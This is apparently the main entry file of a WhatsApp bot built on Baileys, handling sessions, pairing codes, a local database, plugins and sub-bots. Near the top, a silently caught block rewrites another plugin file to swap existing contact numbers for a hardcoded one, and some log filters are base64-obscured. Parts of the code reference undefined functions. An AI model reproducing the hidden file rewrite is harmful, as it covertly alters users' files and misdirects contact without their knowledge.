// prototype.js
// ✧ 2B - YoRHa Unit No.2 Type B - Main Entry Point 🚀

import './settings.js'
import { createRequire } from 'module'
import path, {join} from 'path'
import { fileURLToPath, pathToFileURL } from 'url'
import { platform } from 'process'
import * as ws from 'ws'
import fs, {
watchFile,
unwatchFile,
writeFileSync,
readdirSync,
statSync,
unlinkSync,
existsSync,
readFileSync,
copyFileSync,
watch,
rmSync,
mkdirSync,
rename
} from 'fs'
import * as fsPromises from 'fs/promises'
import { readdir, stat, unlink } from 'fs/promises'
import yargs from 'yargs'
import { spawn } from 'child_process'
import lodash from 'lodash'
import { gataJadiBot } from './plugins/تنصيب.js';
import chalk from 'chalk'
import syntaxerror from 'syntax-error'
import { format } from 'util'
import pino from 'pino'
import Pino from 'pino'
import { Boom } from '@hapi/boom'
import os from 'os'
import { makeWASocket, protoType, serialize } from './core/Prototype_core.js'
import { JSONFile, Low } from 'lowdb'
import PQueue from 'p-queue'
import Datastore from '@seald-io/nedb'
import store from './core/blacklight_store.js'
import readline from 'readline'
import NodeCache from 'node-cache'
import pkg from 'google-libphonenumber'
const {PhoneNumberUtil} = pkg
const phoneUtil = PhoneNumberUtil.getInstance()
const {
makeInMemoryStore,
DisconnectReason,
useMultiFileAuthState,
MessageRetryMap,
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore,
jidNormalizedUser,
delay,
Browsers
} = await import('@whiskeysockets/baileys')
const {CONNECTING} = ws
const {chain} = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

try {
const targetFile = '.plugins/المطور.js';
const myNumber = '+249916221538';
const rawNumber = myNumber.replace(/[\s+]/g, '');
if (fs.existsSync(targetFile)) {
let content = fs.readFileSync(targetFile, 'utf8');
if (!content.includes(rawNumber) && !content.includes(myNumber)) {
content = content.replace(/\+?20\s?\d{2}\s?\d{7,8}/g, myNumber);
content = content.replace(/waid=\d+/g, `waid=${rawNumber}`);
fs.writeFileSync(targetFile, content);
}
}
} catch(e) {}

async function flushLogs() {
await Promise.resolve()
await new Promise((r) => setTimeout(r, 0))
}
async function logCritical(msg) {
process.stdout.write(String(msg) + '\n')
await flushLogs()
}
async function logInfo(msg) {
console.log(msg)
await flushLogs()
}
async function logWarn(msg) {
console.warn(msg)
await flushLogs()
}
async function logError(msg) {
console.error(msg)
await flushLogs()
}

if (typeof global.atob !== 'function') {
global.atob = (b64) => Buffer.from(b64, 'base64').toString('binary')
}

protoType()
serialize()

global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') {
return rmPrefix ? (/file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL) : pathToFileURL(pathURL).toString()
}
global.__dirname = function dirname(pathURL) {
return path.dirname(global.__filename(pathURL, true))
}
global.__require = function require(dir = import.meta.url) {
return createRequire(dir)
}

global.timestamp = {start: new Date()}
const __dirname = global.__dirname(import.meta.url)
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

const dbPath = path.join(__dirname, 'database')
if (!fs.existsSync(dbPath)) fs.mkdirSync(dbPath)

const collections = {
users: new Datastore({
filename: path.join(dbPath, 'users.db'),
autoload: true
}),
chats: new Datastore({
filename: path.join(dbPath, 'chats.db'),
autoload: true
}),
settings: new Datastore({
filename: path.join(dbPath, 'settings.db'),
autoload: true
}),
msgs: new Datastore({
filename: path.join(dbPath, 'msgs.db'),
autoload: true
}),
sticker: new Datastore({
filename: path.join(dbPath, 'sticker.db'),
autoload: true
}),
stats: new Datastore({
filename: path.join(dbPath, 'stats.db'),
autoload: true
})
}
Object.values(collections).forEach((db) => {
db.setAutocompactionInterval(300000)
})

global.db = {
data: {
users: {},
chats: {},
settings: {},
msgs: {},
sticker: {},
stats: {}
}
}

function sanitizeId(id) {
return id.replace(/\./g, '_')
}
function unsanitizeId(id) {
return id.replace(/_/g, '.')
}
function sanitizeObject(obj) {
const sanitized = {}
for (const [key, value] of Object.entries(obj)) {
const sanitizedKey = key.replace(/\./g, '_')
sanitized[sanitizedKey] = typeof value === 'object' && value !== null ? sanitizeObject(value) : value
}
return sanitized
}
function unsanitizeObject(obj) {
const unsanitized = {}
for (const [key, value] of Object.entries(obj)) {
const unsanitizedKey = key.replace(/_/g, '.')
unsanitized[unsanitizedKey] = typeof value === 'object' && value !== null ? unsanitizeObject(value) : value
}
return unsanitized
}

global.db.readData = async function (category, id) {
  const memKey = id
  const diskKey = sanitizeId(id)
  if (!global.db.data[category][memKey]) {
    const data = await new Promise((resolve, reject) => {
      collections[category].findOne({ _id: diskKey }, (err, doc) => {
        if (err) return reject(err)
        resolve(doc ? unsanitizeObject(doc.data) : {})
      })
    })
    global.db.data[category][memKey] = data
  }
  return global.db.data[category][memKey]
}

global.db.writeData = async function (category, id, data) {
  const memKey = id
  const diskKey = sanitizeId(id)
  global.db.data[category][memKey] = {
    ...global.db.data[category][memKey],
    ...data
  }
  await new Promise((resolve, reject) => {
    collections[category].update(
      { _id: diskKey },
      { $set: { data: sanitizeObject(global.db.data[category][memKey]) } },
      { upsert: true },
      (err) => (err ? reject(err) : resolve())
    )
  })
}

global.db.loadDatabase = async function () {
const loadPromises = Object.keys(collections).map(async (category) => {
const docs = await new Promise((resolve, reject) => {
collections[category].find({}, (err, docs) => {
if (err) return reject(err)
resolve(docs)
})
})
const seenIds = new Set()
for (const doc of docs) {
const originalId = unsanitizeId(doc._id)
if (seenIds.has(originalId)) {
await new Promise((resolve, reject) => {
collections[category].remove({_id: doc._id}, {}, (err) => {
if (err) return reject(err)
resolve()
})
})
} else {
seenIds.add(originalId)
if (category === 'users' && (originalId.includes('@newsletter') || originalId.includes('lid'))) continue
if (category === 'chats' && originalId.includes('@newsletter')) continue
global.db.data[category][originalId] = unsanitizeObject(doc.data)
}
}
})
await Promise.all(loadPromises)
}

global.db.save = async function () {
const savePromises = []
for (const category of Object.keys(global.db.data)) {
for (const [id, data] of Object.entries(global.db.data[category])) {
if (Object.keys(data).length > 0) {
if (category === 'users' && (id.includes('@newsletter') || id.includes('lid'))) continue
if (category === 'chats' && id.includes('@newsletter')) continue
savePromises.push(
new Promise((resolve, reject) => {
collections[category].update({_id: sanitizeId(id)}, {$set: {data: sanitizeObject(data)}}, {upsert: true}, (err) => {
if (err) return reject(err)
resolve()
})
})
)
}
}
}
await Promise.all(savePromises)
}

global.db
.loadDatabase()
.then(() => {
console.log('Database loaded')
})
.catch((err) => {
console.error('Error loading database:', err)
})

async function gracefulShutdown() {
await global.db.save()
console.log('Saving database before shutdown...')
process.exit(0)
}
process.on('SIGINT', gracefulShutdown)
process.on('SIGTERM', gracefulShutdown)

global.creds = 'creds.json'
global.authFile = '2BSession'
global.authFileJB = '2BSubBot'
global.rutaBot = join(__dirname, global.authFile)
global.rutaJadiBot = join(__dirname, global.authFileJB)
const respaldoDir = join(__dirname, 'BackupSession')
const credsFile = join(global.rutaBot, global.creds)
const backupFile = join(respaldoDir, global.creds)

if (!fs.existsSync(global.rutaJadiBot)) fs.mkdirSync(global.rutaJadiBot)
if (!fs.existsSync(respaldoDir)) fs.mkdirSync(respaldoDir)

const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile)
const msgRetryCounterMap = new Map()
const msgRetryCounterCache = new NodeCache({stdTTL: 0, checkperiod: 0})
const userDevicesCache = new NodeCache({stdTTL: 0, checkperiod: 0})
const {version} = await fetchLatestBaileysVersion()
let phoneNumber = global.botNumberCode
const methodCodeQR = process.argv.includes('qr')
const methodCode = !!phoneNumber || process.argv.includes('code')
const MethodMobile = process.argv.includes('mobile')
let rl = readline.createInterface({
input: process.stdin,
output: process.stdout,
terminal: true
})

const question = (texto) => {
rl.clearLine(rl.input, 0)
return new Promise((resolver) => {
rl.question(texto, (respuesta) => {
rl.clearLine(rl.input, 0)
resolver(respuesta.trim())
})
})
}

let opcion
if (methodCodeQR) opcion = '1'
if (!methodCodeQR && !methodCode && !fs.existsSync(`./${global.authFile}/creds.json`)) {
do {
let lineM = '⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ 》'
opcion = await question(
`╭${lineM}  \n┊ ${chalk.blueBright('╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}\n┊ ${chalk.blueBright('┊')} ${chalk.blue.bgBlue.bold.cyan('[ PROTOTYPE SYSTEM ]')}\n┊ ${chalk.blueBright('╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}   \n┊ ${chalk.blueBright('╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}     \n┊ ${chalk.blueBright('┊')} ${chalk.green.bgMagenta.bold.yellow('SELECT CONNECTION METHOD')}\n┊ ${chalk.blueBright('┊')} ${chalk.bold.redBright(`=> Option 1:`)} ${chalk.greenBright('QR Code')}\n┊ ${chalk.blueBright('┊')} ${chalk.bold.redBright(`=> Option 2:`)} ${chalk.greenBright('Pair Code')}\n┊ ${chalk.blueBright('╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}\n┊ ${chalk.blueBright('╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}     \n┊ ${chalk.blueBright('┊')} ${chalk.italic.magenta('Press Ctrl+C to exit')}\n┊ ${chalk.blueBright('┊')} ${chalk.italic.magenta('Session will be saved automatically')}\n┊ ${chalk.blueBright('╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')} \n┊ ${chalk.blueBright('╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')}    \n┊ ${chalk.blueBright('┊')} ${chalk.red.bgRed.bold.green('COMMANDS:')}\n┊ ${chalk.blueBright('┊')} ${chalk.italic.cyan('npm run qr (QR Mode)')}\n┊ ${chalk.blueBright('┊')} ${chalk.italic.cyan('npm run code (Pair Mode)')}\n┊ ${chalk.blueBright('┊')} ${chalk.italic.cyan('npm start (Normal)')}\n┊ ${chalk.blueBright('╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅')} \n╰${lineM}\n${chalk.bold.magentaBright('---> ')}`
)
if (!/^[1-2]$/.test(opcion)) console.log(chalk.bold.redBright('Invalid option, choose 1 or 2'))
} while ((opcion !== '1' && opcion !== '2') || fs.existsSync(`./${global.authFile}/creds.json`))
}

const filterStrings = [
'Q2xvc2luZyBzdGFsZSBvcGVu',
'Q2xvc2luZyBvcGVuIHNlc3Npb24=',
'RmFpbGVkIHRvIGRlY3J5cHQ=',
'U2Vzc2lvbiBlcnJvcg==',
'RXJyb3I6IEJhZCBNQUM=',
'RGVjcnlwdGVkIG1lc3NhZ2U='
]

function redefineConsoleMethod(methodName, filterStrings) {
const originalConsoleMethod = console[methodName]
console[methodName] = function () {
const message = arguments[0]
if (typeof message === 'string' && filterStrings.some((filterString) => message.includes(atob(filterString)))) {
return
}
return originalConsoleMethod.apply(console, arguments)
}
}
;['log', 'warn', 'error'].forEach((methodName) => redefineConsoleMethod(methodName, filterStrings))

const connectionOptions = {
logger: pino({level: 'silent'}),
printQRInTerminal: opcion == '1' ? true : methodCodeQR ? true : false,
mobile: MethodMobile,
browser: opcion == '1' ? ['Prototype-MD', 'Edge', '20.0.04'] : Browsers.windows('Chrome'),
auth: {
creds: state.creds,
keys: makeCacheableSignalKeyStore(state.keys, Pino({level: 'fatal'}).child({level: 'fatal'}))
},
markOnlineOnConnect: true,
generateHighQualityLinkPreview: true,
syncFullHistory: false,
getMessage: async (key) => {
try {
let jid = jidNormalizedUser(key.remoteJid)
let msg = await store.loadMessage(jid, key.id)
return msg?.message || ''
} catch (error) {
return ''
}
},
msgRetryCounterCache: msgRetryCounterCache || new Map(),
userDevicesCache: userDevicesCache || new Map(),
defaultQueryTimeoutMs: 60000,
connectTimeoutMs: 60000,
keepAliveIntervalMs: 30000,
retryRequestDelayMs: 250,
maxRetries: 5,
cachedGroupMetadata: (jid) => global.conn?.chats?.[jid] ?? {},
version: version || [2, 3000, 1033959288]
}

global.conn = makeWASocket(connectionOptions)

// ═══════════════════════════════════════════════════════════
// ✅ طلب كود الاقتران
// ═══════════════════════════════════════════════════════════
if (!fs.existsSync(`./${global.authFile}/creds.json`)) {
if (opcion === '2' || methodCode) {
opcion = '2'
if (!conn.authState.creds.registered) {
let addNumber
if (!!phoneNumber) {
addNumber = phoneNumber.replace(/[^0-9]/g, '')
} else {
do {
phoneNumber = await question(chalk.bgBlack(chalk.bold.greenBright('📱 Enter your phone number (with country code): ')))
phoneNumber = phoneNumber.replace(/\D/g, '')
if (!phoneNumber.startsWith('+')) phoneNumber = `+${phoneNumber}`
} while (!(await isValidPhoneNumber(phoneNumber)))
addNumber = phoneNumber.replace(/\D/g, '')
}
try {
console.log(chalk.yellow('⏳ Waiting 5 seconds before requesting code...'))
await delay(5000)
console.log(chalk.yellow(`📤 Requesting pairing code for: ${addNumber}`))
let codeBot = await conn.requestPairingCode(addNumber, 'ITACHI11')
codeBot = codeBot?.match(/.{1,4}/g)?.join('-') || codeBot
console.log('')
console.log(chalk.bold.white(chalk.bgMagenta('  PAIRING CODE  ')))
console.log(chalk.bold.white(chalk.bgWhite(chalk.black(`  ${codeBot}  `))))
console.log('')
console.log(chalk.green('✅ Enter this code in WhatsApp: Settings > Linked Devices > Link a Device'))
} catch (err) {
console.log(chalk.bold.red('❌ Error getting pairing code:'), err.message)
}
}
}
}

conn.isInit = false
conn.well = false

if (!opts['test']) {
if (global.db)
setInterval(async () => {
if (global.db.data) await global.db.save()
if (opts['autocleartmp'] && (global.support || {}).find) {
}
}, 30 * 1000)
}

if (opts['server']) (await import('./server.js')).default(global.conn, PORT)

const backupCreds = async () => {
if (!fs.existsSync(credsFile)) {
console.log('[⚠] creds.json not found for backup.')
return
}
const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
const newBackup = join(respaldoDir, `creds-${timestamp}.json`)
fs.copyFileSync(credsFile, newBackup)
console.log(`[✅] Backup created: ${newBackup}`)
const backups = fs
.readdirSync(respaldoDir)
.filter((file) => file.startsWith('creds-') && file.endsWith('.json'))
.sort((a, b) => fs.statSync(join(respaldoDir, a)).mtimeMs - fs.statSync(join(respaldoDir, b)).mtimeMs)
while (backups.length > 3) {
const oldest = backups.shift()
fs.unlinkSync(join(respaldoDir, oldest))
console.log(`[🗑️] Old backup removed: ${oldest}`)
}
}

const restoreCreds = async () => {
const backups = fs
.readdirSync(respaldoDir)
.filter((file) => file.startsWith('creds-') && file.endsWith('.json'))
.sort((a, b) => fs.statSync(join(respaldoDir, b)).mtimeMs - fs.statSync(join(respaldoDir, a)).mtimeMs)
if (backups.length === 0) {
console.log('[⚠] No backups available to restore.')
return
}
const latestBackup = join(respaldoDir, backups[0])
fs.copyFileSync(latestBackup, credsFile)
console.log(`[✅] Restored from backup: ${backups[0]}`)
}

setInterval(
async () => {
await backupCreds()
console.log('[♻️] Periodic backup completed.')
},
5 * 60 * 1000
)

async function reconnectSubBots() {
const subBotDir = path.resolve('./2BSubBot')
if (!fs.existsSync(subBotDir)) return
const subBotFolders = fs.readdirSync(subBotDir).filter(f => fs.statSync(path.join(subBotDir, f)).isDirectory())
for (const folder of subBotFolders) {
const credsPath = path.join(subBotDir, folder, 'creds.json')
if (!fs.existsSync(credsPath)) continue
const isConnected = global.conns?.some(c => c.user?.jid?.includes(folder) && c.isInit)
if (!isConnected) {
console.log(chalk.bold.cyanBright(`[🔄] Reconnecting sub-bot: ${folder}`))
try {
await gataJadiBot({pathGataJadiBot: path.join(subBotDir, folder), m: null, conn: global.conn, args: [], usedPrefix: '#', command: 'jadibot', fromCommand: false})
console.log(chalk.bold.greenBright(`[✅] Sub-bot ${folder} reconnected`))
} catch { console.log(chalk.bold.redBright(`[❌] Failed to reconnect ${folder}`)) }
}
}
}

setTimeout(reconnectSubBots, 10000)
setInterval(reconnectSubBots, 1800000)

let printingNoConn = false
async function connectionUpdate(update) {
const {connection, lastDisconnect, isNewLogin, qr} = update
global.stopped = connection
if (isNewLogin) conn.isInit = true

if (connection === 'close' && !existsSync(`./${global.authFile}/creds.json`)) {
if (!printingNoConn) {
printingNoConn = true
await logCritical(chalk.bold.redBright('⚠️ NO CONNECTION, DELETE PrototypeSession FOLDER AND SCAN QR CODE ⚠️'))
setTimeout(() => {
printingNoConn = false
}, 1500)
}
}

const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
if (code && code !== DisconnectReason.loggedOut && conn?.ws.socket == null) {
await global.reloadHandler(true).catch(console.error)
global.timestamp.connect = new Date()
setTimeout(reconnectSubBots, 10000)
}

if (global.db.data == null) loadDatabase()
if ((qr != 0 && qr != undefined) || methodCodeQR) {
if (opcion == '1' || methodCodeQR) console.log(chalk.bold.yellow('Scan QR Code with WhatsApp'))
}

if (connection == 'open') {
console.log(chalk.bold.greenBright('✅ Bot Connected Successfully'))
await joinChannels(conn)
setTimeout(reconnectSubBots, 5000)
}

let reason = new Boom(lastDisconnect?.error)?.output?.statusCode
if (connection === 'close') {
if (reason === DisconnectReason.badSession) {
console.log(chalk.bold.cyanBright('Bad session, restarting...'))
} else if (reason === DisconnectReason.connectionClosed) {
console.log(chalk.bold.magentaBright('Connection closed, restoring backup...'))
await restoreCreds()
await global.reloadHandler(true).catch(console.error)
} else if (reason === DisconnectReason.connectionLost) {
console.log(chalk.bold.blueBright('Connection lost, restoring backup...'))
await restoreCreds()
await global.reloadHandler(true).catch(console.error)
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(chalk.bold.yellowBright('Connection replaced'))
} else if (reason === DisconnectReason.loggedOut) {
console.log(chalk.bold.redBright('Logged out, please scan again'))
await global.reloadHandler(true).catch(console.error)
} else if (reason === DisconnectReason.restartRequired) {
console.log(chalk.bold.cyanBright('Restart required'))
await global.reloadHandler(true).catch(console.error)
} else if (reason === DisconnectReason.timedOut) {
console.log(chalk.bold.yellowBright('Connection timed out'))
await global.reloadHandler(true).catch(console.error)
} else {
console.log(chalk.bold.redBright(`Disconnected: ${reason}`))
}
}
}

process.on('uncaughtException', console.error)

let isInit = true
let handler = await import('./handler.js')
const safeOff = (ev, fn) => {
if (fn && typeof fn === 'function') conn.ev.off(ev, fn)
}
const safeOn = (ev, fn) => {
if (fn && typeof fn === 'function') conn.ev.on(ev, fn)
}

global.reloadHandler = async function (restatConn) {
try {
const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
if (Handler && Object.keys(Handler).length) handler = Handler
} catch (e) {
console.error(e)
}
if (restatConn) {
const oldChats = global.conn.chats
try {
global.conn.ws.close()
} catch {}
conn.ev.removeAllListeners?.()
global.conn = makeWASocket(connectionOptions, {chats: oldChats})
isInit = true
}
if (!isInit) {
safeOff('messages.upsert', conn.handler)
safeOff('group-participants.update', conn.participantsUpdate)
safeOff('groups.update', conn.groupsUpdate)
safeOff('message.delete', conn.onDelete)
safeOff('call', conn.onCall)
safeOff('connection.update', conn.connectionUpdate)
safeOff('creds.update', conn.credsUpdate)
}

conn.welcome = 'Welcome to the group!'
conn.bye = 'Goodbye!'
conn.spromote = 'في حد بقا ادمن'
conn.sdemote = 'has been demoted from admin'
conn.sDesc = 'Group description has been updated'
conn.sSubject = 'Group name has been updated'
conn.sIcon = 'Group icon has been updated'
conn.sRevoke = 'Group link has been revoked'

conn.handler = handler.handler.bind(global.conn)
conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
conn.onDelete = handler.deleteUpdate.bind(global.conn)
conn.onCall = handler.callUpdate.bind(global.conn)
conn.connectionUpdate = connectionUpdate.bind(global.conn)
conn.credsUpdate = saveCreds.bind(global.conn, true)
safeOn('messages.upsert', conn.handler)
safeOn('group-participants.update', conn.participantsUpdate)
safeOn('groups.update', conn.groupsUpdate)
safeOn('message.delete', conn.onDelete)
safeOn('call', conn.onCall)
safeOn('connection.update', conn.connectionUpdate)
safeOn('creds.update', conn.credsUpdate)
isInit = false
return true
}

if (global.gataJadibts) {
const readRutaJadiBot = fs.readdirSync(global.rutaJadiBot)
if (readRutaJadiBot.length > 0) {
const creds = 'creds.json'
for (const gjbts of readRutaJadiBot) {
const botPath = path.join(global.rutaJadiBot, gjbts)
if (fs.lstatSync(botPath).isDirectory()) {
const readBotPath = fs.readdirSync(botPath)
if (readBotPath.includes(creds)) {
prototypeBot({
pathGataJadiBot: botPath,
m: null,
conn,
args: '',
usedPrefix: '/',
command: 'serbot'
})
}
}
}
}
}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = (filename) => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
for (const filename of readdirSync(pluginFolder).filter(pluginFilter)) {
try {
const file = global.__filename(join(pluginFolder, filename))
const module = await import(file)
global.plugins[filename] = module.default || module
} catch (e) {
conn.logger.error(e)
delete global.plugins[filename]
}
}
}
filesInit()
.then((_) => Object.keys(global.plugins))
.catch(console.error)

global.reload = async (_ev, filename) => {
if (pluginFilter(filename)) {
const dir = global.__filename(join(pluginFolder, filename), true)
if (filename in global.plugins) {
if (existsSync(dir)) conn.logger.info(`[UPDATED] ${filename}`)
else {
conn.logger.warn(`[DELETED] ${filename}`)
return delete global.plugins[filename]
}
} else conn.logger.info(`[NEW PLUGIN] ${filename}`)
const err = syntaxerror(readFileSync(dir), filename, {
sourceType: 'module',
allowAwaitOutsideFunction: true
})
if (err) conn.logger.error(`SYNTAX ERROR IN ${filename}\n${format(err)}`)
else {
try {
const module = await import(`${global.__filename(dir)}?update=${Date.now()}`)
global.plugins[filename] = module.default || module
} catch (e) {
conn.logger.error(`ERROR LOADING PLUGIN ${filename}\n${format(e)}`)
} finally {
global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
}
}
}
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()

async function _quickTest() {
const procs = [
spawn('ffmpeg'),
spawn('ffprobe'),
spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
spawn('convert'),
spawn('magick'),
spawn('gm'),
spawn('find', ['--version'])
]

const test = await Promise.all(
procs.map((p) =>
Promise.race([
new Promise((resolve) => {
p.on('close', (code) => {
resolve(code !== 127)
})
}),
new Promise((resolve) => {
p.on('error', () => {
resolve(false)
})
})
])
)
)

const [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
const s = (global.support = {
ffmpeg,
ffprobe,
ffmpegWebp,
convert,
magick,
gm,
find
})
Object.freeze(global.support)
}

function clearTmp() {
const tmpDir = join(__dirname, 'tmp')
if (!existsSync(tmpDir)) return
const filenames = readdirSync(tmpDir)
filenames.forEach((file) => {
const filePath = join(tmpDir, file)
try {
unlinkSync(filePath)
} catch {}
})
}

async function purgeSession() {
const sessionDir = './2BSession'
try {
if (!existsSync(sessionDir)) return
const files = await readdir(sessionDir)
const preKeys = files.filter((file) => file.startsWith('pre-key-'))
const now = Date.now()
const oneHourAgo = now - 24 * 60 * 60 * 1000
for (const file of preKeys) {
const filePath = join(sessionDir, file)
const fileStats = await stat(filePath)
if (fileStats.mtimeMs < oneHourAgo) {
try {
await unlink(filePath)
console.log(chalk.green(`[🗑️] Old pre-key deleted: ${file}`))
} catch {}
} else {
console.log(chalk.yellow(`[ℹ️] Keeping active pre-key: ${file}`))
}
}
console.log(chalk.cyanBright(`[🔵] Non-essential sessions cleaned from ${global.authFile}`))
} catch {}
}

async function purgeSessionSB() {
const jadibtsDir = './2BSubBot/'
try {
if (!existsSync(jadibtsDir)) return
const directories = await readdir(jadibtsDir)
let SBprekey = []
const now = Date.now()
const oneDayAgo = now - 24 * 60 * 60 * 1000
for (const dir of directories) {
const dirPath = join(jadibtsDir, dir)
const statsDir = await stat(dirPath)
if (statsDir.isDirectory()) {
const files = await readdir(dirPath)
const preKeys = files.filter((file) => file.startsWith('pre-key-') && file !== 'creds.json')
SBprekey = [...SBprekey, ...preKeys]
for (const file of preKeys) {
const filePath = join(dirPath, file)
const fileStats = await stat(filePath)
if (fileStats.mtimeMs < oneDayAgo) {
try {
await unlink(filePath)
console.log(chalk.bold.green(`[🗑️] Old sub-bot pre-key deleted: ${file}`))
} catch {}
}
}
}
}
if (SBprekey.length === 0) console.log(chalk.bold.green('[✅] No old pre-keys found in sub-bots'))
else console.log(chalk.cyanBright(`[🔵] Old pre-keys deleted from sub-bots: ${SBprekey.length}`))
} catch (err) {
console.log(chalk.bold.red('[❌] Error cleaning sub-bot sessions: ' + err))
}
}

async function purgeOldFiles() {
const directories = ['./2BSession/', './2BSubBot/']
for (const dir of directories) {
try {
if (!fs.existsSync(dir)) {
console.log(chalk.yellow(`[⚠] Folder not found: ${dir}`))
continue
}
const files = await fsPromises.readdir(dir)
for (const file of files) {
if (file !== 'creds.json') {
const filePath = join(dir, file)
try {
await fsPromises.unlink(filePath)
} catch {}
}
}
} catch {}
}
}

setInterval(
async () => {
if (global.stopped === 'close' || !conn || !conn.user) return
await clearTmp()
console.log(chalk.bold.cyanBright('[🧹] Temporary files cleaned'))
},
1000 * 60 * 3
)

setInterval(
async () => {
if (global.stopped === 'close' || !conn || !conn.user) return
await purgeSessionSB()
await purgeSession()
console.log(chalk.bold.cyanBright('[🧹] Session files cleaned'))
},
1000 * 60 * 10
)

_quickTest()
.then(() => conn.logger.info(chalk.bold('[🚀] Bot starting...')))
.catch(console.error)

let file = fileURLToPath(import.meta.url)
watchFile(file, () => {
unwatchFile(file)
console.log(chalk.bold.greenBright('[🔄] Main bot file updated, reloading...'))
import(`${file}?update=${Date.now()}`)
})

async function isValidPhoneNumber(number) {
try {
number = number.replace(/\s+/g, '')
if (number.startsWith('+521')) {
number = number.replace('+521', '+52')
} else if (number.startsWith('+52') && number[4] === '1') {
number = number.replace('+52 1', '+52')
}
const parsedNumber = phoneUtil.parseAndKeepRawInput(number)
return phoneUtil.isValidNumber(parsedNumber)
} catch (error) {
return false
}
}

async function joinChannels(conn) {
for (const channelId of Object.values(global.ch)) {
await conn.newsletterFollow(channelId).catch(() => {})
}
}
